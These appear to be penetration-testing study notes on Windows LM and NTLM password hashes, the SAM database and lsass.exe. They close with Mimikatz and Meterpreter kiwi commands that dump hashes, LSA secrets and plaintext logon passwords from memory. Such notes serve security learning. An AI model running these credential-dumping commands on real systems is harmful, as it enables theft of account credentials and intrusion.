Used to avoid storing the password in plaintext. The process is done by lsass.exe.

LM and NTLM hashes are most likely to come across. LM is very old, so you will likely only see NTLM v1 or v2.

All hashes are stored in the SAM database (all creds stored hashed) and the SAM database cannot be copies while the system is running. However, you can memdump the creds from lsass.exe but this requires an elevated system.

LM Hash was used prior to NT 4.0

 1. Password broken into 2 7 character chunks
 2. All passwords are then stored in uppercase
 3. Each chunk is then hashed seperately with DES Algorithm
 4. Does not include salts to it is easy to break.

NTLM (NT Hash)

 collection of auth protocols that are utilized in windows to faciliatate auth between computers. Implemented as standard since windows vista. When accounts is created it is encrypted using MD4 alg while original is disposed of.

  Improvements over LM:

   1. does not split the hash into chunks
     2. Case Sensitive
     3. Allows the use of symbols and unicode
   
**Mimikatz**

De-facto standard for hash extraction from memory. Can steal clear text creds, hashes, and kerberos tickets from memory.

Kali and Parrot comes with precompiled mimikatz, or you can utilize kiwi from Meterpreter session. Runs with system privs, so you must escalate privs prior to utilizing.

From Meterpreter Shell:

 - pgrep lsass.exe
 - migrate < PID >
 - load kiwi
 - lsa_dump_sam ( will provide you with hashes along with syskey for cracking )

**Without Meterpreter**

Compiled copy stored under /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

privelege::debug ( if you return a result of 20 you have perms for memory hash dump )

lsadump::sam ( dumps hashes )
lsadump::secrets
sekurlsa::logonpasswords ( will reveal plaintext passwords if they are configured to be stored in memory ) 
